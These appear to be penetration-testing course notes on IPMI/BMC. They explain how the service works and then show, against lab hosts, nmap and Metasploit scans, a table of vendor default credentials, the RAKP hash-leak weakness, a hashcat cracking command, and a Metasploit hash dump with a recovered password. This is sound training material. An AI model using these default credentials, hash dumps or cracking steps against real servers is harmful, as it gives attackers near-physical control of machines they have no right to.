# Simple explanation of IPMI

IPMI is like a tiny, always-on remote control built into a server’s hardware. It runs separately from the server’s operating system and CPU, so you can manage the machine even when the OS is crashed, the machine is powered off, or you can’t log in.

Think of it as a small phone inside the server that stays powered and has its own network jack — you call that phone to check the server’s health, open the case, change BIOS settings, or power the server on/off.

### What IPMI lets you do (practical)

- Turn a machine on, off, or reboot remotely even if the OS is dead.
- See the server’s console output (serial over LAN) as if you were plugged into a serial cable.
- Change BIOS settings before the OS boots.
- Read hardware sensors (temperature, fans, voltages) and hardware logs.
- Push firmware or BIOS updates remotely.
- Receive alerts (e.g., via SNMP) when hardware problems happen.

### Why it works when the host is down

The IPMI subsystem (the BMC) is an independent microcontroller with its own power and network path. Because it’s separate from the main CPU and OS, it can operate while the host is off — as long as the server still has standby power and the BMC has LAN access.

### Common ways admins use it

- Fix a server that won’t boot (view console, change BIOS).
- Recover from crashes (power-cycle or access system logs).
- Monitor health (temps, fans) and get alerts.
- Perform remote maintenance or firmware upgrades without being onsite.

### Main components (short)

- **BMC (Baseboard Management Controller):** the on-board microcontroller that runs IPMI.
- **ICMB (Intelligent Chassis Management Bus):** lets chassis talk to chassis.
- **IPMB (Intelligent Platform Management Bus):** local bus that the BMC uses to talk to components.
- **IPMI Memory:** stores event logs, inventory, and config.
- **Comm interfaces:** LAN, serial, PCI management bus, local connectors — how you talk to the BMC.

### Quick history & support

- Introduced by Intel in 1998 and broadly supported by vendors (Dell, HP, Supermicro, Cisco, Intel, etc.).
- IPMI v2.0 supports Serial-over-LAN (SoL) so you can view the system’s serial console across the network.

### Security note (important)

Because IPMI gives low-level access, it’s a high-risk target if left exposed or using default credentials. Best practices include: isolate the management LAN, change defaults, use strong creds, enable encryption/auth (IPMIv2), patch BMC firmware, and log/monitor access.

# Footprinting the Service

IPMI communicates over port `623 UDP`
The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.

If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.

```shell
Ripcord88x@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |
## IPMI RAKP Protocol Weakness (Note)

- **Issue:** IPMI 2.0’s RAKP (Remote Auth Key Protocol) leaks a _salted SHA1/MD5 password hash_ from the BMC **before** authentication completes.
- **Impact:** Attackers can capture password hashes for _any valid user_ on the BMC and crack them offline.
- **Cracking:**
- Use Hashcat mode `7300` for IPMI hashes.
- Example (HP iLO default 8-char alphanumeric):

```sh
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

→ tries all uppercase letters + numbers.

- **No direct fix:** the weakness is part of the IPMI spec itself.

To retrieve IPMI hashes, we can use  Metasploit

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


> [!NOTE] Note
> Experimenting with different word lists is crucial for obtaining the password from the acquired hash.

